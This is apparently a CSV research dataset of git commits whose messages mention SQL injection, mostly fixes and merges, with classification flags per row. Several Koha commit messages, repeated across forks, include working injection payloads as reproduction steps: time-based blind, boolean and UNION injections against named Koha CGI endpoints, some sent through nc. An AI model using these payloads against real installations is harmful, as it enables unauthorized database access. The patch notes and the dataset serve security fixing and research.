repo_name,commit,author_name,commit_timestamp,message,is_corrective,is_adaptive,is_perfective,is_refactor,is_cursing,is_positive_sentiment,is_negative_sentiment,is_performance,files,non_test_files,code_files,code_non_test_files,duration
jonsito/AgilityContest,1ceb23e2148d8256381df405a0af12c909ef84f1,Juan Antonio Martinez,2019-05-24 07:02:25 UTC,"Fix duplicated name detection in Clubes/Pruebas/jornadas

Just to avoid sql injection and related errors

Notice that Dogs and Handlers shouldn't be checked for duplicated
as duplicates may exist :-( ..... perhaps a warning on handlers...
",true,false,false,false,false,false,false,false,4,4,4,4,15495
Cvolton/GMDprivateServer,06017573aba12f000371c2eef42e681d451617f1,Cvolton,2017-04-08 19:01:59 UTC,"SQL injection patch
",false,false,false,false,false,false,false,false,1,1,1,1,162
TerraMA2/terrama2,46cbffd611f575208f0e1a6c05a7250c810ce489,janosimas,2017-04-28 11:29:46 UTC,"improved filter by value and sql injection protections
",false,false,true,true,false,false,false,false,3,3,1,1,1116
TerraMA2/terrama2,81a7603d86aa6fb8f254d129188172147e6a6e73,Jano Simas,2017-04-28 14:04:15 UTC,"Merge pull request #968 from janosimas/master

	improved filter by value and sql injection protections",false,true,false,false,false,false,false,false,3,3,1,1,4
OpenGamePanel/OGP-Website,d2dc443111a80352ce3b626fc2c9a1cbec7a7bae,DieFeM,2018-07-23 11:57:18 UTC,"Fixes to prevent SQL injection on API.
",true,false,false,false,false,false,false,false,1,1,1,1,522
MarkUsProject/Markus,38c4c61ef26d4b267b16acd36fcbcbb93cce35ec,PkHutch,2018-07-03 15:52:09 UTC,"SQL Injection Fixes #2 (#3429)

Fix SQL Injection possibility in collection.where call.
",true,false,false,false,false,false,false,false,1,1,1,1,14023
centreon/centreon,a1a1eaa1e8f5bb20c2d140d584852218fd1a4518,Stéphane C.979,2018-07-06 11:43:51 UTC,"fix(sec): Fix SQL injection from metrics RPN's field (#6356)
",true,false,false,false,false,false,false,false,1,1,1,1,16031
folio-org/raml-module-builder,54478ffb1dffab2b87660ecbd8c57d89a2c4f9d3,Julian Ladisch,2019-05-21 13:19:29 UTC,"RMB-199: Single quote SQL Injection in PostgresClient.delete(table, pojo, handler)
",false,false,false,false,false,false,false,false,2,1,2,1,853
folio-org/raml-module-builder,c5b84a0f6be45e42ff0185dd60e0e3cc76d3eaa9,julianladisch,2019-05-22 20:49:09 UTC,"Merge pull request #424 from folio-org/RMB-199-PostgresClient.delete-sql-injection

RMB-199: Single quote SQL Injection in PostgresClient.delete",false,true,false,false,false,false,false,false,3,2,2,1,9
folio-org/raml-module-builder,a4c663f57bb4c9f2678b951c2ae3c709bede3844,Julian Ladisch,2019-05-22 20:40:05 UTC,"Merge branch 'master' into RMB-199-PostgresClient.delete-sql-injection
",false,true,false,false,false,false,false,false,13,9,3,1,2
folio-org/raml-module-builder,199d896ffcbc85f03851acac721b0eda06a5bfff,Julian Ladisch,2019-05-27 12:47:01 UTC,"RMB-379: wrong masking of Criteria.setValue(Object) results in SQL Injection

There are three ways to call Criteria.setValue(Object):

setValue(""'"" + value.replace(""'"", ""''"") + ""'"");
setValue(""'"" + value + ""'"");
setValue(value);

The first one is always correct and will never result in any SQL injection.

The second and the third one are prone to SQL injection if value may contain single quotes.

The documentation does not mention the first way.

My proposal is to replace setValue(Object) by setVal(String) where setVal(String) will
only accept the third way. Internally it will always wrap the value in single quotes
and mask any containing single quotes by duplicating them.

This prevents SQL injection and is also the most easy way to invoke. The new method name
will trigger compile errors. This forces developers
* to replace setValue by setVal and
* to remove any single quote adding.

I don't see a reason why one would like to pass in an Object. We may add setValObject(Object)
or similar methods lateron if needed.
",true,false,true,true,false,false,false,false,6,3,6,3,161
folio-org/raml-module-builder,1e8da73784a69af4ebfd6784332c571310c0647d,Julian Ladisch,2019-05-22 11:19:20 UTC,"Merge branch 'master' into RMB-199-PostgresClient.delete-sql-injection
",false,true,false,false,false,false,false,false,134,84,84,62,885
catmaid/CATMAID,f5ff07cfd1a58c2157f5499ac02ec7a8322fb875,Tom Kazimiers,2019-08-04 22:01:45 UTC,"Upgrade Django from v2.1.10 to v2.1.11

This fixes a few security issues, including a possible SQL injection
with JSONField, which we use. More details here:

https://docs.djangoproject.com/en/2.2/releases/2.1.11/
",true,true,true,false,false,false,false,false,1,1,0,0,3291
derUli/ulicms,1a60c87d4b9121a4b0fc7ed949a6e19036a71b6e,Ulrich Schmidt,2016-06-06 09:53:09 UTC,"fixed potential sql injection
",true,false,false,false,false,false,false,false,1,1,1,1,5863
ebmdatalab/openprescribing,48bcb2a7bfa46ee5acfd5794c7bbdb747fdf097b,Seb Bacon,2016-06-13 10:40:34 UTC,"Guard against SQL injection attacks

This uses a whitelist as column names aren't legal locations for the use
of bind variables.
",false,false,false,false,false,false,false,false,2,1,2,1,135
Weasyl/weasyl,88b94137ab977d1a41f5e3bc5326fd308365645e,Charmander,2016-06-17 03:17:00 UTC,"Feel safer with sql_number_list

It was sitting on the ledge of SQL injection.
",false,false,false,false,false,false,false,false,1,1,1,1,23
UniTime/unitime,008623106489d5818c9daa56818bbc35abd1150f,tomas-muller,2016-06-09 21:16:35 UTC,"Security: Posible SQL Injection Fixed

- Instructional Offerings: Search, Worksheet PDF
- Instructors: Manage Instructors List
- Buildings: Update Rooms
",true,false,false,false,false,false,false,false,4,4,4,4,4394
centreon/centreon,d95d855ae392102ab7fa20bc13139e6fed50a485,Maximilien Bersoult,2015-06-29 09:42:24 UTC,"* [WEB-331] Modify queries for protect SQL injection
",false,false,false,false,false,false,false,false,20,20,20,20,4
blabla1337/skf-flask,40ced98049d1e7750088d0e5de9c2c67721892c4,blabla1337,2015-06-12 17:23:34 UTC,"Merge pull request #48 from mgijsbertihodenpijl/master

Code example SQL injection Java",false,true,true,false,false,false,false,false,1,1,0,0,2
intel-hpdd/intel-manager-for-lustre,4e36b48e8a1e044d1272d1bbb7a648e84def4071,Brian J. Murrell,2015-06-22 18:05:41 UTC,"HYD-4490 Limit chroma-config to root

A checkmarx scan revealed chroma-config has 4 SQL Injection
vulnerabilities where we read input user input directly from
the command line without an escaping or sanitization step.

Limit chroma-config to be run by only root to mitiate the
exposure.  Disclaimer: this mitigation only really applies to
systems where root is already omnipotent and is neutralized on
systems where anyone can be root because security is locked
down with SELinux rather than limiting root access.

Signed-off-by: Brian J. Murrell <2a8f564cbb80211e19c0a14fed38a451599c042f@intel.com>
Change-Id: I51d544e2e72ff70f916c937c3556d84f9bfb2530
Reviewed-on: http://review.whamcloud.com/15378
Tested-by: Jenkins
Tested-by: Chroma Test User <a0b98b2ff5154776fa24760ef410655af7a8b56c@intel.com>
Reviewed-by: Chris Gearing <149a3c4298d99c315fc555357d57d2940923ba5f@intel.com>
Reviewed-by: Joe Grund <5a0004131f5af71cc30270f318d2c30ba7aaa99a@intel.com>
Reviewed-on: http://review.whamcloud.com/15387
",true,false,false,false,false,false,false,false,1,1,0,0,63
blabla1337/skf-flask,1c3df8c9ba7ab9b9b6fbb8136a72668b1d5c0bea,Martijn Gijsberti Hodenpijl,2015-06-12 07:20:08 UTC,"Code example SQL injection
",false,false,true,false,false,false,false,false,1,1,0,0,
hubzero/hubzero-cms,ca24bfde8eb4988c504de4a7e9822ab947b08f55,Kevin Wojkovich,2015-06-22 19:51:32 UTC,"[COM_CITATION] Escape all tags to prevent SQL injection.
",false,false,true,false,false,false,false,false,1,1,1,1,91
hubzero/hubzero-cms,c16e6bbd5611144e1f4a54878fcdeb3c0a5c66e7,Shawn Rice,2015-06-23 20:53:54 UTC,"[PLG_RESOURCES_USAGE] Fixing SQL injection issue with timestamp
",true,false,false,false,false,false,false,false,1,1,1,1,10
centreon/centreon,6dc4a49e709b4a0cda6a53a2887c43843d68ecb4,Kevin Duret,2015-06-01 11:30:42 UTC,"Fix sql injection on centreon bam module
",true,false,false,false,false,false,false,false,1,1,1,1,259
bywatersolutions/ByWater-KOHA,57b01fb655955ac630d6018d03f4d134e7e3e25a,Chris Cormack,2015-06-18 20:35:07 UTC,"Bug 14412: SQL injection possible

There is a SQL Injection vulnerability in the
/cgi-bin/koha/opac-tags_subject.pl script.

By manipulating the variable 'number', the database can be accessed
via time-based blind injections.

The following string serves as an example:

/cgi-bin/koha/opac-tags_subject.pl?number=1+PROCEDURE+ANALYSE+(EXTRACTVALUE(9743,CONCAT(0x5c,(BENCHMARK(5000000,MD5('evil'))))),1)

To exploit the vulnerability, no authentication is needed

To test
1/ Turn on mysql query logging
2/ Hit /cgi-bin/koha/opac-tags_subject.pl?number=1+PROCEDURE+ANALYSE+(EXTRACTVALUE(9743,CONCAT(0x5c,(BENCHMARK(5000000,MD5('evil'))))),1)
3/ Check the logs notice something like
  SELECT entry,weight FROM tags ORDER BY weight DESC LIMIT 1
  PROCEDURE ANALYSE
  (EXTRACTVALUE(9743,CONCAT(0x5c,(BENCHMARK(5000000,MD5('evil'))))),1)
4/ Apply patch
5/ Hit the url again
6/ Notice the log now only has
   SELECT entry,weight FROM tags ORDER BY weight DESC LIMIT 1

Signed-off-by: Jonathan Druart <90effa772b5c8a7a3420e6b7ea56e265888c5743@koha-community.org>
Signed-off-by: Katrin Fischer <eb5a7ed6178886f9a3c70794f3de5f89db9dcb5f@bsz-bw.de>
Confirmed the problem and the fix for it.
Signed-off-by: Tomas Cohen Arazi <63ac9f6777fb741d62c33cd73a438a8ce82c7d4a@unc.edu.ar>
",true,false,true,false,false,false,true,false,1,1,1,1,92839
colinsc/koha,57b01fb655955ac630d6018d03f4d134e7e3e25a,Chris Cormack,2015-06-18 20:35:07 UTC,"Bug 14412: SQL injection possible

There is a SQL Injection vulnerability in the
/cgi-bin/koha/opac-tags_subject.pl script.

By manipulating the variable 'number', the database can be accessed
via time-based blind injections.

The following string serves as an example:

/cgi-bin/koha/opac-tags_subject.pl?number=1+PROCEDURE+ANALYSE+(EXTRACTVALUE(9743,CONCAT(0x5c,(BENCHMARK(5000000,MD5('evil'))))),1)

To exploit the vulnerability, no authentication is needed

To test
1/ Turn on mysql query logging
2/ Hit /cgi-bin/koha/opac-tags_subject.pl?number=1+PROCEDURE+ANALYSE+(EXTRACTVALUE(9743,CONCAT(0x5c,(BENCHMARK(5000000,MD5('evil'))))),1)
3/ Check the logs notice something like
  SELECT entry,weight FROM tags ORDER BY weight DESC LIMIT 1
  PROCEDURE ANALYSE
  (EXTRACTVALUE(9743,CONCAT(0x5c,(BENCHMARK(5000000,MD5('evil'))))),1)
4/ Apply patch
5/ Hit the url again
6/ Notice the log now only has
   SELECT entry,weight FROM tags ORDER BY weight DESC LIMIT 1

Signed-off-by: Jonathan Druart <90effa772b5c8a7a3420e6b7ea56e265888c5743@koha-community.org>
Signed-off-by: Katrin Fischer <eb5a7ed6178886f9a3c70794f3de5f89db9dcb5f@bsz-bw.de>
Confirmed the problem and the fix for it.
Signed-off-by: Tomas Cohen Arazi <63ac9f6777fb741d62c33cd73a438a8ce82c7d4a@unc.edu.ar>
",true,false,true,false,false,false,true,false,1,1,1,1,92839
bywatersolutions/bws-package,57b01fb655955ac630d6018d03f4d134e7e3e25a,Chris Cormack,2015-06-18 20:35:07 UTC,"Bug 14412: SQL injection possible

There is a SQL Injection vulnerability in the
/cgi-bin/koha/opac-tags_subject.pl script.

By manipulating the variable 'number', the database can be accessed
via time-based blind injections.

The following string serves as an example:

/cgi-bin/koha/opac-tags_subject.pl?number=1+PROCEDURE+ANALYSE+(EXTRACTVALUE(9743,CONCAT(0x5c,(BENCHMARK(5000000,MD5('evil'))))),1)

To exploit the vulnerability, no authentication is needed

To test
1/ Turn on mysql query logging
2/ Hit /cgi-bin/koha/opac-tags_subject.pl?number=1+PROCEDURE+ANALYSE+(EXTRACTVALUE(9743,CONCAT(0x5c,(BENCHMARK(5000000,MD5('evil'))))),1)
3/ Check the logs notice something like
  SELECT entry,weight FROM tags ORDER BY weight DESC LIMIT 1
  PROCEDURE ANALYSE
  (EXTRACTVALUE(9743,CONCAT(0x5c,(BENCHMARK(5000000,MD5('evil'))))),1)
4/ Apply patch
5/ Hit the url again
6/ Notice the log now only has
   SELECT entry,weight FROM tags ORDER BY weight DESC LIMIT 1

Signed-off-by: Jonathan Druart <90effa772b5c8a7a3420e6b7ea56e265888c5743@koha-community.org>
Signed-off-by: Katrin Fischer <eb5a7ed6178886f9a3c70794f3de5f89db9dcb5f@bsz-bw.de>
Confirmed the problem and the fix for it.
Signed-off-by: Tomas Cohen Arazi <63ac9f6777fb741d62c33cd73a438a8ce82c7d4a@unc.edu.ar>
",true,false,true,false,false,false,true,false,1,1,1,1,92839
colinsc/koha,d8bccd612638c4728f561972daf7f70d49d263a5,Jonathan Druart,2015-06-22 08:56:26 UTC,"Bug 14426: Escape or use placeholders for sql parameters

Does this patch enough to prevent sql injection in borrowers_out.pl?

====================================================================
1. ""Criteria"" Parameter, Payload: ELT(1=1,'evil') / ELT(1=2,'evil')
====================================================================

echo -ne ""POST /cgi-bin/koha/reports/borrowers_out.pl
HTTP/1.1\r\nHost: testbox:9002\r\nContent-Length:
186\r\n\r\nFilter=P_COM&Filter=&Limit=&output=file&basename=Export&MIME=CSV&sep=%3B&report_name=&do_it=1&userid=<username>&password=<password>&branch=&koha_login_context=intranet&Criteria=ELT(1=2,'evil')""
| nc testbox 9002

echo -ne ""POST /cgi-bin/koha/reports/borrowers_out.pl
HTTP/1.1\r\nHost: testbox:9002\r\nContent-Length:
186\r\n\r\nFilter=P_COM&Filter=&Limit=&output=file&basename=Export&MIME=CSV&sep=%3B&report_name=&do_it=1&userid=<username>&password=<password>&branch=&koha_login_context=intranet&Criteria=ELT(1=1,'evil')""
| nc testbox 9002

====================================================================
2. ""Filter"" Parameter, Payload: P_COM'+AND+'a'='a / P_COM'+AND+'a'='b
====================================================================

echo -ne ""POST /cgi-bin/koha/reports/borrowers_out.pl
HTTP/1.1\r\nHost: testbox:9002\r\nContent-Length:
183\r\n\r\nkoha_login_context=intranet&Limit=&Criteria=branchcode&output=file&basename=Export&MIME=CSV&sep=;&report_name=&do_it=1&userid=<userid>&password=<password>&branch=&Filter=P_COM'+AND+'a'='a""
| nc testbox 9002

echo -ne ""POST /cgi-bin/koha/reports/borrowers_out.pl
HTTP/1.1\r\nHost: testbox:9002\r\nContent-Length:
183\r\n\r\nkoha_login_context=intranet&Limit=&Criteria=branchcode&output=file&basename=Export&MIME=CSV&sep=;&report_name=&do_it=1&userid=<userid>&password=<password>&branch=&Filter=P_COM'+AND+'a'='b""
| nc testbox 9002

====================================================================

Signed-off-by: Chris Cormack <chrisc@catalyst.net.nz>

Signed-off-by: Katrin Fischer <9b69ec3a4d06e697f94de4e5bc733b1bd1394784@web.de>
Signed-off-by: Tomas Cohen Arazi <63ac9f6777fb741d62c33cd73a438a8ce82c7d4a@theke.io>
",false,false,false,false,false,false,true,false,1,1,1,1,31
bywatersolutions/ByWater-KOHA,d8bccd612638c4728f561972daf7f70d49d263a5,Jonathan Druart,2015-06-22 08:56:26 UTC,"Bug 14426: Escape or use placeholders for sql parameters

Does this patch enough to prevent sql injection in borrowers_out.pl?

====================================================================
1. ""Criteria"" Parameter, Payload: ELT(1=1,'evil') / ELT(1=2,'evil')
====================================================================

echo -ne ""POST /cgi-bin/koha/reports/borrowers_out.pl
HTTP/1.1\r\nHost: testbox:9002\r\nContent-Length:
186\r\n\r\nFilter=P_COM&Filter=&Limit=&output=file&basename=Export&MIME=CSV&sep=%3B&report_name=&do_it=1&userid=<username>&password=<password>&branch=&koha_login_context=intranet&Criteria=ELT(1=2,'evil')""
| nc testbox 9002

echo -ne ""POST /cgi-bin/koha/reports/borrowers_out.pl
HTTP/1.1\r\nHost: testbox:9002\r\nContent-Length:
186\r\n\r\nFilter=P_COM&Filter=&Limit=&output=file&basename=Export&MIME=CSV&sep=%3B&report_name=&do_it=1&userid=<username>&password=<password>&branch=&koha_login_context=intranet&Criteria=ELT(1=1,'evil')""
| nc testbox 9002

====================================================================
2. ""Filter"" Parameter, Payload: P_COM'+AND+'a'='a / P_COM'+AND+'a'='b
====================================================================

echo -ne ""POST /cgi-bin/koha/reports/borrowers_out.pl
HTTP/1.1\r\nHost: testbox:9002\r\nContent-Length:
183\r\n\r\nkoha_login_context=intranet&Limit=&Criteria=branchcode&output=file&basename=Export&MIME=CSV&sep=;&report_name=&do_it=1&userid=<userid>&password=<password>&branch=&Filter=P_COM'+AND+'a'='a""
| nc testbox 9002

echo -ne ""POST /cgi-bin/koha/reports/borrowers_out.pl
HTTP/1.1\r\nHost: testbox:9002\r\nContent-Length:
183\r\n\r\nkoha_login_context=intranet&Limit=&Criteria=branchcode&output=file&basename=Export&MIME=CSV&sep=;&report_name=&do_it=1&userid=<userid>&password=<password>&branch=&Filter=P_COM'+AND+'a'='b""
| nc testbox 9002

====================================================================

Signed-off-by: Chris Cormack <chrisc@catalyst.net.nz>

Signed-off-by: Katrin Fischer <9b69ec3a4d06e697f94de4e5bc733b1bd1394784@web.de>
Signed-off-by: Tomas Cohen Arazi <63ac9f6777fb741d62c33cd73a438a8ce82c7d4a@theke.io>
",false,false,false,false,false,false,true,false,1,1,1,1,31
bywatersolutions/bws-package,d8bccd612638c4728f561972daf7f70d49d263a5,Jonathan Druart,2015-06-22 08:56:26 UTC,"Bug 14426: Escape or use placeholders for sql parameters

Does this patch enough to prevent sql injection in borrowers_out.pl?

====================================================================
1. ""Criteria"" Parameter, Payload: ELT(1=1,'evil') / ELT(1=2,'evil')
====================================================================

echo -ne ""POST /cgi-bin/koha/reports/borrowers_out.pl
HTTP/1.1\r\nHost: testbox:9002\r\nContent-Length:
186\r\n\r\nFilter=P_COM&Filter=&Limit=&output=file&basename=Export&MIME=CSV&sep=%3B&report_name=&do_it=1&userid=<username>&password=<password>&branch=&koha_login_context=intranet&Criteria=ELT(1=2,'evil')""
| nc testbox 9002

echo -ne ""POST /cgi-bin/koha/reports/borrowers_out.pl
HTTP/1.1\r\nHost: testbox:9002\r\nContent-Length:
186\r\n\r\nFilter=P_COM&Filter=&Limit=&output=file&basename=Export&MIME=CSV&sep=%3B&report_name=&do_it=1&userid=<username>&password=<password>&branch=&koha_login_context=intranet&Criteria=ELT(1=1,'evil')""
| nc testbox 9002

====================================================================
2. ""Filter"" Parameter, Payload: P_COM'+AND+'a'='a / P_COM'+AND+'a'='b
====================================================================

echo -ne ""POST /cgi-bin/koha/reports/borrowers_out.pl
HTTP/1.1\r\nHost: testbox:9002\r\nContent-Length:
183\r\n\r\nkoha_login_context=intranet&Limit=&Criteria=branchcode&output=file&basename=Export&MIME=CSV&sep=;&report_name=&do_it=1&userid=<userid>&password=<password>&branch=&Filter=P_COM'+AND+'a'='a""
| nc testbox 9002

echo -ne ""POST /cgi-bin/koha/reports/borrowers_out.pl
HTTP/1.1\r\nHost: testbox:9002\r\nContent-Length:
183\r\n\r\nkoha_login_context=intranet&Limit=&Criteria=branchcode&output=file&basename=Export&MIME=CSV&sep=;&report_name=&do_it=1&userid=<userid>&password=<password>&branch=&Filter=P_COM'+AND+'a'='b""
| nc testbox 9002

====================================================================

Signed-off-by: Chris Cormack <chrisc@catalyst.net.nz>

Signed-off-by: Katrin Fischer <9b69ec3a4d06e697f94de4e5bc733b1bd1394784@web.de>
Signed-off-by: Tomas Cohen Arazi <63ac9f6777fb741d62c33cd73a438a8ce82c7d4a@theke.io>
",false,false,false,false,false,false,true,false,1,1,1,1,31
OpenConext/OpenConext-engineblock,54c48e1bee269a0913e0c7c3faa04c3668332b30,Nic Wortel,2017-03-27 14:19:34 UTC,"Update zendframework/zendframework1 from v1.12.16 to v1.12.20

This mitigates a number of CVE's:

 * CVE-2016-6233: Potential SQL injection in ORDER and GROUP statements of Zend_Db_Select
   http://framework.zend.com/security/advisory/ZF2016-02

 * Potential Information Disclosure and Insufficient Entropy vulnerability in Zend\Captcha\Word
   http://framework.zend.com/security/advisory/ZF2015-09

 * Potential Insufficient Entropy Vulnerability in ZF1
   http://framework.zend.com/security/advisory/ZF2016-01

 * Potential SQL injection in ORDER and GROUP functions of ZF1
   https://framework.zend.com/security/advisory/ZF2016-03
",true,true,false,false,false,false,false,false,1,1,0,0,107
bobintetley/asm3,067da9018ed62aeb3ab62c2cf7205b97e36b4687,Robin Rawson-Tetley,2017-03-08 08:51:36 UTC,"minor sql injection bug
",true,false,false,false,false,false,false,false,2,2,2,2,866
OCA/reporting-engine,949b8d31cd6d91bca2183291f8f2ef216f555520,Andrea,2017-03-06 08:48:49 UTC,"[MIG+IMP] bi_view_editor: Migration to v10 + enhancements

* Add menu items creation feature
* Added selection of fields of a tree view
* Improved usability and strings made translatable
* Avoid display duplicated nodes
* Robustness
* Updated Dutch translation
* Avoid possible sql injection in bi_view_editor
* Removed deprecated RegistryManager
",false,false,true,false,false,false,false,false,81,80,10,9,4
find-sec-bugs/find-sec-bugs,ef0b854c0bb4ad9f32c892fb96b5ae593d7cdcaa,Philippe Arteau,2017-01-03 19:27:33 UTC,"Merge pull request #253 from h3xstream/master

Turbine SQL injections",false,true,false,false,false,false,false,false,31,20,26,15,1158
bywatersolutions/bws-package,e2d1bafa22f213658fc040d541534299c126bd1b,Kyle M Hall,2017-01-30 11:52:56 UTC,"Revert ""Bug 17902: Fix possible SQL injection in serials editing""

This reverts commit 8924439054fec94acabef6045f21369117e528f0.

Signed-off-by: Kyle M Hall <3c25b01657254677d3e1a8fd1f0742c5d489bd39@bywatersolutions.com>
",true,false,false,false,false,false,false,false,1,1,1,1,5601
colinsc/koha,4dc7c32a3db11db2a3862e4979e62db23b2a208c,Kyle M Hall,2017-01-30 12:12:08 UTC,"Revert ""Bug 17902: Fix possible SQL injection in serials editing""

This reverts commit 904716f581102887c27d5bfc727430564cc12284.

Signed-off-by: Kyle M Hall <3c25b01657254677d3e1a8fd1f0742c5d489bd39@bywatersolutions.com>
",true,false,false,false,false,false,false,false,1,1,1,1,19
bywatersolutions/ByWater-KOHA,e2d1bafa22f213658fc040d541534299c126bd1b,Kyle M Hall,2017-01-30 11:52:56 UTC,"Revert ""Bug 17902: Fix possible SQL injection in serials editing""

This reverts commit 8924439054fec94acabef6045f21369117e528f0.

Signed-off-by: Kyle M Hall <3c25b01657254677d3e1a8fd1f0742c5d489bd39@bywatersolutions.com>
",true,false,false,false,false,false,false,false,1,1,1,1,5601
bywatersolutions/ByWater-KOHA,4dc7c32a3db11db2a3862e4979e62db23b2a208c,Kyle M Hall,2017-01-30 12:12:08 UTC,"Revert ""Bug 17902: Fix possible SQL injection in serials editing""

This reverts commit 904716f581102887c27d5bfc727430564cc12284.

Signed-off-by: Kyle M Hall <3c25b01657254677d3e1a8fd1f0742c5d489bd39@bywatersolutions.com>
",true,false,false,false,false,false,false,false,1,1,1,1,19
bywatersolutions/bws-package,4dc7c32a3db11db2a3862e4979e62db23b2a208c,Kyle M Hall,2017-01-30 12:12:08 UTC,"Revert ""Bug 17902: Fix possible SQL injection in serials editing""

This reverts commit 904716f581102887c27d5bfc727430564cc12284.

Signed-off-by: Kyle M Hall <3c25b01657254677d3e1a8fd1f0742c5d489bd39@bywatersolutions.com>
",true,false,false,false,false,false,false,false,1,1,1,1,19
colinsc/koha,e2d1bafa22f213658fc040d541534299c126bd1b,Kyle M Hall,2017-01-30 11:52:56 UTC,"Revert ""Bug 17902: Fix possible SQL injection in serials editing""

This reverts commit 8924439054fec94acabef6045f21369117e528f0.

Signed-off-by: Kyle M Hall <3c25b01657254677d3e1a8fd1f0742c5d489bd39@bywatersolutions.com>
",true,false,false,false,false,false,false,false,1,1,1,1,5601
bywatersolutions/ByWater-KOHA,8924439054fec94acabef6045f21369117e528f0,Jonathan Druart,2017-01-10 17:06:51 UTC,"Bug 17902: Fix possible SQL injection in serials editing

/cgi-bin/koha/serials/serials-edit.pl?serstatus=*/+,2,3,'2016-12-12','2016-12-12',6,'jjj7','jjj8'%20--%20-&subscriptionid=1+and+1%3d2+Union+all+select+111+/*

The SQL query is not constructed correctly, placeholders must be used.
Subscription id and status list can be provided by the user.

This vulnerability has been reported by MDSec.

Signed-off-by: Mirko Tietgen <mirko@abunchofthings.net>

Signed-off-by: Kyle M Hall <3c25b01657254677d3e1a8fd1f0742c5d489bd39@bywatersolutions.com>
",true,false,false,false,false,false,false,false,1,1,1,1,133
colinsc/koha,8924439054fec94acabef6045f21369117e528f0,Jonathan Druart,2017-01-10 17:06:51 UTC,"Bug 17902: Fix possible SQL injection in serials editing

/cgi-bin/koha/serials/serials-edit.pl?serstatus=*/+,2,3,'2016-12-12','2016-12-12',6,'jjj7','jjj8'%20--%20-&subscriptionid=1+and+1%3d2+Union+all+select+111+/*

The SQL query is not constructed correctly, placeholders must be used.
Subscription id and status list can be provided by the user.

This vulnerability has been reported by MDSec.

Signed-off-by: Mirko Tietgen <mirko@abunchofthings.net>

Signed-off-by: Kyle M Hall <3c25b01657254677d3e1a8fd1f0742c5d489bd39@bywatersolutions.com>
",true,false,false,false,false,false,false,false,1,1,1,1,133
bywatersolutions/bws-package,8924439054fec94acabef6045f21369117e528f0,Jonathan Druart,2017-01-10 17:06:51 UTC,"Bug 17902: Fix possible SQL injection in serials editing

/cgi-bin/koha/serials/serials-edit.pl?serstatus=*/+,2,3,'2016-12-12','2016-12-12',6,'jjj7','jjj8'%20--%20-&subscriptionid=1+and+1%3d2+Union+all+select+111+/*

The SQL query is not constructed correctly, placeholders must be used.
Subscription id and status list can be provided by the user.

This vulnerability has been reported by MDSec.

Signed-off-by: Mirko Tietgen <mirko@abunchofthings.net>

Signed-off-by: Kyle M Hall <3c25b01657254677d3e1a8fd1f0742c5d489bd39@bywatersolutions.com>
",true,false,false,false,false,false,false,false,1,1,1,1,133
bywatersolutions/ByWater-KOHA,904716f581102887c27d5bfc727430564cc12284,Jonathan Druart,2017-01-10 17:06:51 UTC,"Bug 17902: Fix possible SQL injection in serials editing

/cgi-bin/koha/serials/serials-edit.pl?serstatus=*/+,2,3,'2016-12-12','2016-12-12',6,'jjj7','jjj8'%20--%20-&subscriptionid=1+and+1%3d2+Union+all+select+111+/*

The SQL query is not constructed correctly, placeholders must be used.
Subscription id and status list can be provided by the user.

This vulnerability has been reported by MDSec.

Signed-off-by: Mirko Tietgen <mirko@abunchofthings.net>

Signed-off-by: Nick Clemens <nick@bywatersolutions.com>

Signed-off-by: Kyle M Hall <3c25b01657254677d3e1a8fd1f0742c5d489bd39@bywatersolutions.com>
",true,false,false,false,false,false,false,false,1,1,1,1,133
colinsc/koha,b0bb1b0aa60071950a39b1c1b9e9ec145b304086,Jonathan Druart,2017-01-13 15:46:51 UTC,"Bug 17904: Fix possible SQL injection in late orders

To recreate:
/cgi-bin/koha/acqui/lateorders.plop=send_alert&ordernumber=1)and%20(select*from(select(sleep(20)))a)--%20&letter_code=0

Notice the delay.

The SQL query is not constructed correctly, placeholders must be used.

This vulnerability has been reported by MDSec.

Signed-off-by: Mirko Tietgen <mirko@abunchofthings.net>
Signed-off-by: Marcel de Rooy <m.de.rooy@rijksmuseum.nl>

Signed-off-by: Kyle M Hall <3c25b01657254677d3e1a8fd1f0742c5d489bd39@bywatersolutions.com>
",true,false,false,false,false,false,false,false,1,1,1,1,5
